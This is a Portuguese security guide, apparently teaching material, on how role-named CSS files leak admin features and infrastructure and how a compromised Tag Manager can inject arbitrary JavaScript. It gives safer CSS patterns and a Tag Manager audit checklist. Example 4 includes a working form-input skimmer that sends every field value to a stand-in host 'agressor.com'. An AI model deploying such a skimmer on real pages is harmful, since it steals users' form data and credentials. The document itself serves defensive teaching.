# Code Examples: CSS e Tag Manager — Superficie de Ataque

## Exemplo 1: Arquivos CSS por papel (vulneravel)

O agressor observa os arquivos CSS carregados em cada contexto:

```
Visitante (nao logado)  → GET /css/viewer.css     ✓ 200
Usuario cadastrado      → GET /css/user.css        ✓ 200
Moderador               → GET /css/moderator.css   ✓ 200
```

Tentativas do agressor:
```
GET /css/admin.css       → ✓ 200  (vazou!)
GET /css/root.css        → ✗ 404
GET /css/superadmin.css  → ✓ 200  (vazou!)
```

## Exemplo 2: Conteudo do admin.css revelando informacao

```css
/* Ambientes — revela infraestrutura */
.env-staging .payment-gateway-bypass { display: block; }
.env-production .debug-toolbar { display: none; }
.env-dev .fake-email-banner { display: block; }

/* Clusters regionais — revela logica de compliance */
.cluster-eu .gdpr-controls { display: block; }
.cluster-us .ccpa-controls { display: block; }

/* Papeis — revela hierarquia de permissoes */
.role-root { }
.super-admin { }
.admin-only { }
.root-only { }
.moderator { }
.viewer { }

/* IDs — revela rotas potenciais */
#admin-panel { }
#system-settings { }
#advanced-config { }

/* Funcionalidades admin — catalogo completo */
.user-impersonation-button { }
.audit-log-viewer { }
.database-export-all { }
.system-wipe { }
.gdpr-data-purge { }
.hard-delete-user { }
.issue-refund { }
.system-restart { }
.cache-flush { }
.mfa-force-enroll { }
.mfa-grace-period-control { }
```

### O que o agressor extrai disso

| Informacao | Classe CSS | Proximo passo do agressor |
|------------|-----------|--------------------------|
| Existe ambiente staging | `.env-staging` | Tentar acessar staging (menos protegido) |
| Staging tem bypass de pagamento | `.payment-gateway-bypass` | Prioridade maxima: encontrar staging |
| Producao tem debug toolbar escondida | `.debug-toolbar { display: none }` | Abrir console, `display: block` |
| Nomes dos papeis | `.role-root`, `.super-admin` | Usar em brute force, engenharia social |
| Admin pode personificar usuario | `.user-impersonation-button` | Alvo: ganhar acesso admin |
| Admin pode exportar banco | `.database-export-all` | Alvo: exfiltracao de dados |
| Rota provavel | `#admin-panel` | Tentar `GET /admin-panel` |

## Exemplo 3: CSS seguro para area administrativa

### Opcao A: Tailwind (classes utilitarias)
```css
/* Nenhuma informacao de dominio vazada */
.flex.items-center.justify-between.p-4.bg-white.rounded-lg.shadow { }
.hidden.lg\:block { }
.text-sm.font-medium.text-gray-700 { }
```

### Opcao B: CSS Modules (hashes gerados)
```css
/* Nomes gerados automaticamente no build */
._a3f2k { padding: 1rem; }
._x7m2p { display: flex; }
._q9w1r { background: white; }
```

### Opcao C: CSS servido dinamicamente
```javascript
// Express.js — rota protegida por autenticacao e autorizacao
const express = require('express')
const path = require('path')
const { authenticate, authorize } = require('./middleware/auth')

const app = express()

// CSS publico — servido normalmente como arquivo estatico
app.use('/css/public', express.static('public/css'))

// CSS admin — servido via rota protegida
app.get('/api/styles/admin', authenticate, authorize('admin'), (req, res) => {
  const cssPath = path.join(__dirname, 'private', 'styles', 'admin.css')
  res.type('text/css')
  res.sendFile(cssPath)
})
```

```html
<!-- No HTML da area admin, carregado via JavaScript apos autenticacao -->
<script>
  fetch('/api/styles/admin', {
    credentials: 'include'
  })
    .then(res => res.text())
    .then(css => {
      const style = document.createElement('style')
      style.textContent = css
      document.head.appendChild(style)
    })
</script>
```

## Exemplo 4: Como Tag Manager injeta scripts

O mecanismo basico de injecao de scripts que o Tag Manager usa:

```javascript
// Isso e essencialmente o que o Tag Manager faz
const script = document.createElement('script')
script.src = 'https://terceiro.com/analytics.js'
document.body.appendChild(script)
```

Isso significa que quem controla o Tag Manager pode inserir **qualquer JavaScript** na pagina:

```javascript
// Exemplo de ataque possivel via Tag Manager comprometido
const script = document.createElement('script')
script.textContent = `
  // Captura todos os inputs de formulario
  document.querySelectorAll('input').forEach(input => {
    input.addEventListener('change', () => {
      fetch('https://agressor.com/collect', {
        method: 'POST',
        body: JSON.stringify({
          name: input.name,
          value: input.value,
          page: location.href
        })
      })
    })
  })
`
document.body.appendChild(script)
```

## Exemplo 5: Comparacao de processos de inclusao de JavaScript

### Via repositorio de codigo (seguro)
```
Programador
  → git clone (chave SSH 2048 bits)
    → edita codigo
      → executa testes locais
        → git push
          → CI/CD roda testes automatizados
            → Pull Request aberto
              → Code Review (2 programadores)
                → Aprovacao
                  → Deploy para producao
```

### Via Tag Manager (potencialmente inseguro)
```
Qualquer pessoa com a senha
  → Login com email compartilhado
    → Cola script copiado de um blog
      → Publica
        → JavaScript rodando em producao com privilegio total
```

## Exemplo 6: Checklist de seguranca para Tag Manager

```markdown
## Auditoria de Acesso ao Tag Manager

- [ ] Cada pessoa tem conta individual (sem email compartilhado)
- [ ] 2FA habilitado em todas as contas
- [ ] Processo de offboarding inclui remocao de acesso ao Tag Manager
- [ ] Scripts incluidos sao revisados por alguem tecnico antes de publicar
- [ ] Nao se copia scripts de fontes nao verificadas (blogs, foruns)
- [ ] Existe log de quem incluiu o que e quando
- [ ] Equipe de marketing entende os riscos de acesso ao Tag Manager
- [ ] Acesso de publicacao restrito a pessoas especificas (nao todos do marketing)
```